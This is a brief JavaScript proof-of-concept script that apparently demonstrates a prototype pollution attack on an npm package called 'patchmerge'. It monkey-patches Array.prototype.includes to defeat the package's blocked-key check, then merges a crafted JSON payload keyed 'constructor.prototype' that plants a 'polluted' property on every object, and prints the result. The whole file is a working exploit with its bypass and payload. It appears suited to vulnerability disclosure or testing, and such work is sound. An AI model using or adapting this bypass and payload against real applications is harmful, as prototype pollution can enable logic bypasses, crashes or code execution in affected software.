Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const patchMerge = require('patchmerge');
console.log({}.polluted);
let obj = {};
patchMerge(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);